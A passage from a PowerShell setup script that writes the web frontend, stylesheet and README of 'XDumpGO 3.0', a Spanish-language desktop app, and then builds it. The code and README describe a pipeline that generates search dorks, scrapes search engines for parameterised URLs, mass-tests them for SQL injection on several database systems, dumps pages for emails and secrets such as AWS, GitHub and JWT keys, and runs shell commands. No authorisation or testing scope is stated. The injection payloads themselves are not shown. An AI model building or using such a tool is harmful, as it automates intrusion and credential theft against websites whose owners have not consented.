  if (!ds.length) { el.innerHTML = '<div class="empty">Sin dorks todavía.</div>'; return; }
  const MAX = 400;
  el.innerHTML = ds.slice(0, MAX).map((d) =>
    '<div class="row-item"><code>' + esc(d.text) + "</code></div>"
  ).join("") + (ds.length > MAX ? '<div class="empty">…y ' + (ds.length - MAX) + " más</div>" : "");
}

$("#btn-dorks").addEventListener("click", () => {
  try {
    const modes = [];
    if ($("#d-mode-site").checked) modes.push("site");
    if ($("#d-mode-inurl").checked) modes.push("inurl");
    const r = callJSON("genDorks", {
      keywords: lines($("#d-words").value),
      domains: lines($("#d-domains").value),
      params: $("#d-params").value.split(/\s+/).filter(Boolean),
      max: +$("#d-max").value || 300,
      modes: modes,
    });
    if (r.ok) { toast(r.count + " dorks generadas", "ok"); renderDorks(); }
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-copy-dorks").addEventListener("click", () => {
  const ds = results("dorks");
  copyText(Array.isArray(ds) ? ds.map((d) => d.text).join("\n") : "");
});

$("#btn-export-dorks").addEventListener("click", () => {
  const ds = results("dorks");
  exportText("dorks.txt", Array.isArray(ds) ? ds.map((d) => d.text).join("\n") : "");
});

// ---------- Scrape / URLs ----------
function renderURLs() {
  let us = results("urls");
  if (!Array.isArray(us)) us = [];
  const onlyP = $("#u-only-params").checked;
  const view = onlyP ? us.filter((u) => u.params && u.params.length) : us;
  $("#u-count").textContent = view.length;
  const el = $("#url-list");
  if (!view.length) { el.innerHTML = '<div class="empty">Sin URLs todavía.</div>'; return; }
  const MAX = 300;
  el.innerHTML =
    '<table><thead><tr><th>ID</th><th>Host</th><th>Path</th><th>Params</th><th>Source</th></tr></thead><tbody>' +
    view.slice(0, MAX).map((u) =>
      "<tr><td>" + u.id + "</td><td>" + esc(u.host) + "</td><td>" + esc(u.path) +
      "</td><td>" + esc((u.params || []).join(",")) +
      "</td><td class='dim'>" + esc(u.source) + "</td></tr>"
    ).join("") +
    "</tbody></table>" +
    (view.length > MAX ? '<div class="empty">…y ' + (view.length - MAX) + " más</div>" : "");
}

$("#u-only-params").addEventListener("change", renderURLs);

$("#btn-scrape").addEventListener("click", () => {
  try {
    const r = callJSON("startScrape", {
      dorks: lines($("#s-dorks").value),
      engine: $("#s-engine").value,
      workers: +$("#s-workers").value || 16,
      perDork: +$("#s-perdork").value || 30,
      pages: +$("#s-pages").value || 2,
    });
    if (r.ok) toast("Scrape iniciado (" + r.count + " búsquedas)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-copy-urls").addEventListener("click", () => {
  const us = results("urls");
  copyText(Array.isArray(us) ? us.map((u) => u.raw).join("\n") : "");
});

$("#btn-export-urls").addEventListener("click", () => {
  const us = results("urls");
  exportText("urls.txt", Array.isArray(us) ? us.map((u) => u.raw).join("\n") : "");
});

// ---------- Exploit (SQLi) ----------
function renderExploits() {
  let xs = results("exploits");
  if (!Array.isArray(xs)) xs = [];
  $("#ex-count").textContent = xs.length;
  const el = $("#exploit-list");
  if (!xs.length) { el.innerHTML = '<div class="empty">Sin hallazgos todavía.</div>'; return; }
  const MAX = 200;
  el.innerHTML = xs.slice(0, MAX).map((x) =>
    '<div class="inj">' +
      '<div class="inj-head"><span class="badge ok">' + esc(x.technique).toUpperCase() + "</span> <b>" + esc(x.param) +
      "</b> · " + esc(x.dbms || "?") + (x.version ? " " + esc(x.version) : "") + "</div>" +
      '<code class="inj-url">' + esc(x.url) + "</code>" +
      '<div class="dim small">' + esc(x.finding) + "</div>" +
    "</div>"
  ).join("");
}

$("#btn-exploit").addEventListener("click", () => {
  try {
    const r = callJSON("startExploit", {
      techniques: {
        error: $("#x-error").checked,
        union: $("#x-union").checked,
        blind: $("#x-blind").checked,
        stacked: $("#x-stacked").checked,
        time: $("#x-time").checked,
      },
      dbms: {
        mysql: $("#x-mysql").checked,
        mssql: $("#x-mssql").checked,
        postgresql: $("#x-pg").checked,
        oracle: $("#x-oracle").checked,
      },
      heuristics: $("#x-heur").checked,
      intensity: +$("#x-intensity").value || 2,
      workers: +$("#x-workers").value || 16,
      maxUrls: +$("#x-maxurls").value || 200,
    });
    if (r.ok) toast("Exploit iniciado (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-export-exploits").addEventListener("click", () => {
  const xs = results("exploits");
  if (!Array.isArray(xs) || !xs.length) { toast("nada que exportar", "err"); return; }
  const txt = xs.map((x) =>
    x.technique.toUpperCase() + " | " + x.dbms + (x.version ? " " + x.version : "") +
    " | param=" + x.param + " | " + x.url + "\n  " + x.finding
  ).join("\n");
  exportText("sqli-findings.txt", txt);
});

// ---------- Dump ----------
function renderDumps() {
  let ds = results("dumps");
  if (!Array.isArray(ds)) ds = [];
  $("#dump-count").textContent = ds.length;
  const el = $("#dump-list");
  if (!ds.length) { el.innerHTML = '<div class="empty">Sin dumps todavía.</div>'; return; }
  const MAX = 100;
  el.innerHTML = ds.slice(0, MAX).map((d) => {
    const items = [];
    if (d.emails && d.emails.length) items.push("<b>Emails:</b> " + esc(d.emails.join(", ")));
    if (d.secrets && d.secrets.length) items.push("<b>Secretos:</b> " + esc(d.secrets.slice(0, 8).join(" | ")));
    if (d.forms && d.forms.length) items.push("<b>Forms:</b> " + esc(d.forms.slice(0, 3).join(" | ")));
    if (d.jsFiles && d.jsFiles.length) items.push("<b>JS:</b> " + esc(d.jsFiles.slice(0, 5).join(" | ")));
    if (d.links && d.links.length) items.push("<b>Links:</b> " + d.links.length + " (ver export)");
    if (d.comments && d.comments.length) items.push("<b>Comentarios:</b> " + esc(d.comments.slice(0, 2).join(" | ")));
    return (
      '<details class="dump">' +
        "<summary>" + esc(d.title || d.url) +
        ' <span class="dim">HTTP ' + d.status + " · " + d.size + "B · " + d.durationMs + "ms</span></summary>" +
        '<div class="dim small">' + esc(d.url) + "</div>" +
        '<div class="dump-body">' + (items.join("<br>") || "<span class='dim'>sin datos extraídos</span>") + "</div>" +
      "</details>"
    );
  }).join("");
}

function dumpCfg(id) {
  return {
    id: id || "",
    workers: +$("#dm-workers").value || 16,
    maxUrls: +$("#dm-maxurls").value || 100,
    onlyOk: $("#dm-onlyok").checked,
  };
}

$("#btn-dump").addEventListener("click", () => {
  try {
    const r = callJSON("startDump", dumpCfg($("#dm-id").value.trim()));
    if (r.ok) toast("Dump iniciado (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-dump-all").addEventListener("click", () => {
  try {
    const r = callJSON("startDump", dumpCfg(""));
    if (r.ok) toast("Dump all iniciado (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-export-dumps").addEventListener("click", () => {
  const ds = results("dumps");
  if (!Array.isArray(ds) || !ds.length) { toast("nada que exportar", "err"); return; }
  exportText("dumps.json", JSON.stringify(ds, null, 2));
});

// ---------- Shell ----------
function renderShell() {
  let ss = results("shell");
  if (!Array.isArray(ss)) ss = [];
  $("#sh-count").textContent = ss.length;
  const el = $("#shell-list");
  if (!ss.length) { el.innerHTML = '<div class="empty">Sin salidas todavía.</div>'; return; }
  el.innerHTML = ss.slice(-20).reverse().map((s) =>
    '<div class="shell"><code class="sh-cmd">$ ' + esc(s.cmd) + " <span class='dim'>[exit " + s.exit + "]</span></code>" +
    '<pre class="sh-out">' + esc(s.out || s.err || "(sin salida)") + "</pre></div>"
  ).join("");
}

$("#btn-shell").addEventListener("click", () => {
  try {
    const r = callJSON("startShell", {
      cmd: $("#sh-cmd").value.trim(),
      args: $("#sh-args").value.split(/\s+/).filter(Boolean),
      cwd: $("#sh-cwd").value.trim(),
    });
    if (r.ok) toast("comando lanzado", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-gen-shell").addEventListener("click", () => {
  try {
    const r = callJSON("genShell", {
      name: "mi-lote",
      cmds: [{
        cmd: $("#sh-cmd").value.trim(),
        args: $("#sh-args").value.split(/\s+/).filter(Boolean),
        cwd: $("#sh-cwd").value.trim(),
      }],
    });
    if (r && r.ok) { toast("Lote generado: " + r.path, "ok"); call("openFile", r.path); }
    else toast((r && r.error) || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-batch").addEventListener("click", () => {
  try {
    const r = parseRet(call("startBatch"));
    if (r && r.ok) toast("batch lanzado", "ok");
    else toast((r && r.error) || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

// ---------- Settings / Log ----------
function renderSettings() {
  try {
    const s = getJSON("getConfig");
    if (document.activeElement !== $("#set-json") && s && typeof s === "object") {
      $("#set-json").value = JSON.stringify(s, null, 2);
    }
  } catch (e) { /* ignore */ }
}

$("#btn-save-settings").addEventListener("click", () => {
  try {
    const r = parseRet(call("saveConfig", $("#set-json").value));
    if (r && r.ok) toast("config guardada", "ok");
    else toast((r && r.error) || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-load-settings").addEventListener("click", () => {
  try {
    const s = getJSON("getConfig");
    $("#set-json").value = JSON.stringify(s, null, 2);
    toast("config recargada", "ok");
  } catch (e) { toast(e.message, "err"); }
});

function renderLogs() {
  let ls = results("logs");
  if (!Array.isArray(ls)) ls = [];
  const el = $("#log-list");
  el.innerHTML = ls.slice(-150).reverse().map((l) =>
    '<div class="log ' + esc(l.kind) + '"><span class="dim">' + esc(l.ts) + "</span> " + esc(l.msg) + "</div>"
  ).join("");
}

// ---------- Stop ----------
$("#btn-stop").addEventListener("click", () => {
  try {
    parseRet(call("stopAll"));
    toast("stop enviado", "info");
  } catch (e) { toast(e.message, "err"); }
});

// ---------- Init ----------
if (!gw) {
  const d = document.createElement("div");
  d.style.cssText = "background:#d29922;color:#000;padding:8px 16px;font-size:12px";
  d.textContent = "Modo navegador: ejecuta xdumpgo2.exe para activar las funciones Go.";
  document.body.prepend(d);
}
renderSettings();
renderDorks();
renderURLs();
renderExploits();
renderDumps();
renderShell();
renderLogs();
'@

Write-File (Join-Path (Join-Path $root "web") "style.css") @'
:root {
  --bg: #0d1117;
  --bg2: #161b22;
  --bg3: #1c2330;
  --fg: #e6edf3;
  --dim: #8b949e;
  --acc: #58a6ff;
  --ok: #3fb950;
  --err: #f85149;
  --warn: #d29922;
  --border: #30363d;
}
* { box-sizing: border-box; }
html, body { margin: 0; height: 100%; }
body {
  background: var(--bg);
  color: var(--fg);
  font: 13px/1.45 "Segoe UI", system-ui, sans-serif;
  display: flex;
  flex-direction: column;
}
header {
  display: flex; align-items: center; gap: 14px;
  padding: 10px 16px;
  background: var(--bg2);
  border-bottom: 1px solid var(--border);
}
.brand { font-size: 16px; font-weight: 700; letter-spacing: .3px; white-space: nowrap; }
.brand .ver { color: var(--acc); }
.brand .by { color: var(--dim); font-weight: 400; font-size: 11px; margin-left: 8px; }
.stats { display: flex; gap: 12px; align-items: center; flex: 1; color: var(--dim); font-size: 12px; overflow: hidden; }
.pill {
  background: var(--bg3); border: 1px solid var(--border);
  padding: 2px 10px; border-radius: 999px; color: var(--dim); white-space: nowrap;
}
.pill.on { color: var(--ok); border-color: var(--ok); }
nav {
  display: flex; gap: 4px; padding: 8px 16px 0;
  background: var(--bg2); border-bottom: 1px solid var(--border);
}
.tab {
  background: transparent; border: 1px solid transparent; border-bottom: none;
  color: var(--dim); padding: 7px 14px; cursor: pointer; border-radius: 8px 8px 0 0;
  font-size: 13px;
}
.tab:hover { color: var(--fg); }
.tab.active { background: var(--bg); color: var(--fg); border-color: var(--border); }
main { flex: 1; overflow: auto; padding: 16px; }
.panel { display: none; }
.panel.active { display: block; }
.grid2 { display: grid; grid-template-columns: 380px 1fr; gap: 14px; align-items: start; }
.card {
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: 10px; padding: 14px;
}
.card h3 { margin: 0 0 10px; font-size: 14px; }
label { display: block; color: var(--dim); font-size: 11px; margin: 10px 0 4px; text-transform: uppercase; letter-spacing: .4px; }
input, textarea, select {
  width: 100%; background: var(--bg); color: var(--fg);
  border: 1px solid var(--border); border-radius: 6px; padding: 7px 9px;
  font: 12px/1.4 Consolas, "Cascadia Mono", monospace;
}
textarea { resize: vertical; }
.row { display: flex; gap: 10px; align-items: flex-end; margin-top: 10px; flex-wrap: wrap; }
.row > div { flex: 1; }
.chk { display: flex; align-items: center; gap: 6px; color: var(--fg); font-size: 12px; text-transform: none; margin: 0; }
.chk input { width: auto; }
.btn {
  background: var(--acc); color: #04121f; border: none; border-radius: 6px;
  padding: 8px 14px; cursor: pointer; font-weight: 600; font-size: 13px;
}
.btn:hover { filter: brightness(1.1); }
.btn.small { padding: 4px 10px; font-size: 11px; font-weight: 500; }
.btn.danger { background: var(--err); color: #fff; }
.actions { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; flex-wrap: wrap; }
.actions label { margin: 0; }
.hint { color: var(--dim); font-size: 11px; margin: 0 0 6px; }
code { background: var(--bg3); padding: 1px 5px; border-radius: 4px; font-size: 11px; }
.list { max-height: 62vh; overflow: auto; border: 1px solid var(--border); border-radius: 8px; background: var(--bg); }
.empty { color: var(--dim); padding: 14px; text-align: center; font-size: 12px; }
.row-item { padding: 5px 10px; border-bottom: 1px solid var(--border); }
.table-wrap { border: none; background: transparent; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th, td { text-align: left; padding: 5px 8px; border-bottom: 1px solid var(--border); vertical-align: top; }
th { position: sticky; top: 0; background: var(--bg2); color: var(--dim); font-size: 11px; text-transform: uppercase; }
.dim { color: var(--dim); }
.small { font-size: 11px; }
.inj { border-bottom: 1px solid var(--border); padding: 8px 10px; }
.inj-head { margin-bottom: 4px; }
.badge { padding: 1px 8px; border-radius: 999px; font-size: 10px; font-weight: 700; }
.badge.ok { background: rgba(63,185,80,.15); color: var(--ok); }
.badge.no { background: rgba(139,148,158,.15); color: var(--dim); }
.inj-url { display: block; word-break: break-all; margin-bottom: 4px; }
pre.snippet { margin: 4px 0 0; background: var(--bg3); border-radius: 6px; padding: 6px 8px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
details.dump { border-bottom: 1px solid var(--border); padding: 6px 10px; }
details.dump summary { cursor: pointer; }
.dump-body { margin-top: 6px; font-size: 12px; word-break: break-all; }
.shell { border-bottom: 1px solid var(--border); padding: 8px 10px; }
.sh-cmd { display: block; margin-bottom: 4px; }
pre.sh-out { margin: 0; background: var(--bg3); border-radius: 6px; padding: 8px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
.mono { font-family: Consolas, monospace; }
.log { padding: 2px 10px; border-bottom: 1px solid rgba(48,54,61,.5); font-size: 11px; }
.log.ok { color: var(--ok); }
.log.err { color: var(--err); }
.log.warn { color: var(--warn); }
#toast {
  position: fixed; right: 16px; bottom: 16px; max-width: 460px;
  background: var(--bg3); border: 1px solid var(--border); color: var(--fg);
  padding: 10px 14px; border-radius: 8px; opacity: 0; pointer-events: none;
  transition: opacity .2s; font-size: 12px; z-index: 99;
}
#toast.show { opacity: 1; }
#toast.ok { border-color: var(--ok); }
#toast.err { border-color: var(--err); }
'@

Write-File (Join-Path $root "README.md") @'
# XDumpGO 3.0 SUPER (Quartz Inc.)

App de escritorio (WebView2): dorking, scraping, SQLi, dump de páginas y shell.
Versión mejorada del original: más rápida y con mejores resultados.

## Compilar
    go build -ldflags "-s -w" -o xdumpgo2.exe .

Requiere Go 1.22+ y el runtime WebView2 (preinstalado en Windows 10/11).

## Flujo
1. Dorks   -> genera dorks (site: / inurl:).
2. Scrape  -> busca en DDG/Google/Bing (multi-página) y extrae URLs candidatas.
3. SQLi    -> error / union / blind / time / stacked (MySQL, MSSQL, Postgres, Oracle, +detección SQLite/DB2/Informix).
4. Dump    -> extrae emails/links/JS/secretos (JWT, AWS, Google, GitHub, keys)/comentarios.
5. Shell   -> comandos locales, lote .bat/.sh y batch.

## Mejoras vs original
- HTTP/2 + keep-alive + pool de buffers 512KB + DNS timeout 1.5s.
- 16 threads por defecto; probes SQLi con timeout corto (4s) y early-exit por parámetro.
- Motor DDG (sin captcha) + Google con fallback de URLs absolutas + Bing limpiando tracking.
- Dedup por host+path+query (no pierde variantes ?id=).
- Time-based SQLi opcional y más fingerprints de DBMS con versión.
- Self-test: xdumpgo2.exe -test

## Exportar (descarga a tu PC)
Cada pestaña tiene "Exportar": guarda en .\exports\ junto al exe y abre el
archivo en el Explorador. Config persistente: xdumpgo3.config.json.
'@

Write-Host ""
Write-Host "Proyecto creado en: $root" -ForegroundColor Cyan

if (Get-Command go -ErrorAction SilentlyContinue) {
  Write-Host "Compilando..." -ForegroundColor Cyan
  Push-Location $root
  try {
    go mod tidy
    if ($LASTEXITCODE -ne 0) {
      Write-Host "go mod tidy falló (¿sin internet?), usando go.mod existente" -ForegroundColor Yellow
    }
    go build -ldflags "-s -w" -o xdumpgo2.exe .
    if ($LASTEXITCODE -eq 0) {
      Write-Host "OK: $(Join-Path $root 'xdumpgo2.exe')" -ForegroundColor Green
    } else {
      Write-Host "Error de compilación (revisa la salida de go build)" -ForegroundColor Red
    }
  } finally {
    Pop-Location
  }
} else {
  Write-Host "Go no encontrado en PATH. Instala Go 1.22+ y ejecuta:" -ForegroundColor Yellow
  Write-Host "  cd $root"
  Write-Host "  go build -ldflags `"-s -w`" -o xdumpgo2.exe ."
}
Write-Host ""
Write-Host "Listo. Ejecuta xdumpgo2.exe cuando quieras." -ForegroundColor Cyan
